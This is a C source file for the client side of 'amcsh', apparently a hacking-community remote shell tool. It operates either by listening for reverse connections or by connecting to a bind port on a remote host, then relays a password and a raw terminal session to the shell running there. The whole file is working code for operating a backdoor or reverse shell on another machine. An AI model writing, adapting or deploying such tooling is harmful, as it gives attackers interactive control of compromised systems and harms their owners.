/*
 *  amcsh.c - amcsh client
 *  t57root@gmail.com
 *  openwill.me / www.hackshell.net
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>

#include "config.h"
#include "amcsh.h"
#include "functions.h"

int server,client,masterfd;
unsigned char message[BUFSIZ + 1];

void sendws()
{
    struct winsize ws;
    if( isatty( 0 ) ){
        if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 ){
            perror( "ioctl()" );
            return;
        }
    }
    else{
        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    WINCH winch;
    winch.flag[0] = magickey[0];
    winch.flag[1] = magickey[1];
    winch.flag[2] = 's';
    winch.flag[3] = 's';
    winch.ws_row = ws.ws_row;
    winch.ws_col = ws.ws_col;
    wsend(masterfd, &winch, sizeof(winch));
}

int worker(fd)
{
    masterfd=fd;
    fd_set rd;
    int len,ret;
    struct winsize ws;
    struct termios tp, tr;

    pMSG msg = (pMSG)malloc(sizeof(MSG));
    strncpy((char *)msg->term,"TERM=",strlen("TERM="));
    strncpy((char *)msg->term+5,getenv( "TERM" ),strlen(getenv( "TERM" )));

    if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 ){
        perror( "ioctl()" );
        return 1;
    }
    msg->ws_row=ws.ws_row;
    msg->ws_col=ws.ws_col;

    char pwd[21];
    write(STDOUT_FILENO,"Password: ",10);
    scanf("%20[0-9a-zA-Z ]s", pwd);
    strncpy((char *)msg->pwd,pwd,strlen(pwd));
    ret = wsend(fd, msg, sizeof(MSG));
    free(msg);

    if( isatty( 1 ) ){
        if( tcgetattr( 1, &tp ) < 0 ){
            perror( "tcgetattr()" );
            return 1;
        }

        memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
        tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN]  = 1;
        tr.c_cc[VTIME] = 0;

        if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 ){
            perror( "tcsetattr()" );
            return 1;
        }
    }

    signal(SIGWINCH, sendws);

    while( 1 ){
        FD_ZERO( &rd );
        FD_SET( 0, &rd );
        FD_SET( fd, &rd );
        if( select( fd + 1, &rd, NULL, NULL, NULL ) < 0 ){
            if (errno == EINTR)
                continue;
            perror( "select" );
            break;
        }

        if( FD_ISSET( fd, &rd ) ){
            if ((ret = wrecv(fd , message)) > 0){
                ret=write(1, &message, ret);
                if(ret<=0){
                    perror("write");
                    break;
                }
            }
            else break;
        }

        if( FD_ISSET( 0, &rd ) ){
            len = read( 0, message, BUFSIZ );
            if( len == 0 ){
                fprintf( stderr, "stdin: eof\n" );
                break;
            }

            if( len < 0 ){
                perror( "read" );
                break;
            }

            ret=wsend(fd, &message, len);
        }
    }
    printf("%s","Connection lost.");
    if( isatty( 1 ) ){
        tcsetattr( 1, TCSADRAIN, &tp );
    }

    return 0;
}

int amcsh_connect(char *addr, char *port)
{
    struct sockaddr_in server_addr;

    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(addr);
    server_addr.sin_port        = htons(atoi(port));

    server = socket( AF_INET, SOCK_STREAM, 0 );
    printf("About to connect to %s:%s\n", addr, port);
    if(connect( server, (struct sockaddr *) &server_addr,sizeof( server_addr ) )<0){
        perror("connect");
        return 1;
    }
    worker(server);
    close(server);
    return 0;
}

int amcsh_listen(char *addr, char *port)
{
    int n;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
 
    server = socket( AF_INET, SOCK_STREAM, 0 );
    n = 1;
    setsockopt( server, SOL_SOCKET, SO_REUSEADDR, (void *) &n, sizeof(n));
 
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(atoi(port));
    server_addr.sin_addr.s_addr = inet_addr(ADDR);
 
    if(bind(server, (struct sockaddr *) &server_addr,sizeof(server_addr))){
        perror("bind()");
        return 1;
    }
 
    if(listen(server, 5 ) < 0){
        perror("listen()");
        return 1;
    }
 
    n = sizeof( client_addr );
    printf("Listening on %s:%s\n", addr, port);
    client = accept( server, (struct sockaddr *)&client_addr, (socklen_t * __restrict__)&n );
    worker(client);
    close(client);

    return 0;
}

int main(int argc,char **argv)
{
    printf("\n\e[1;34m\a"
        "   ##    #    #   ####    ####   #    #\n"
        "  #  #   ##  ##  #    #  #       #    #\n"
        " #    #  # ## #  #        ####   ######\n"
        " ######  #    #  #            #  #    #\n"
        " #    #  #    #  #    #  #    #  #    #\n"
        " #    #  #    #   ####    ####   #    #\n\n"
        "[ amcsh ] - A More Comfortable SHell\n"
        "by t57root @ openwill.me\n"
        "<t57root@gmail.com>  [www.HackShell.net]\e[m\n\n"
        "Usage: %s {listen|connect} ip port\n"
        "    listen:\tListen at ip:port for connection as a server (Reverse connection mode)\n"
        "    connect:\tConnect to ip:port as a client (Bind port mode)\n\n", argv[0]);
    if(argc!=4){
        return 0;
    }
    if(strncmp("listen",argv[1],7)==0){
        return amcsh_listen(argv[2],argv[3]);
    }
    else if(strncmp("connect",argv[1],8)==0){
        return amcsh_connect(argv[2],argv[3]);
    }
    return 0;
}
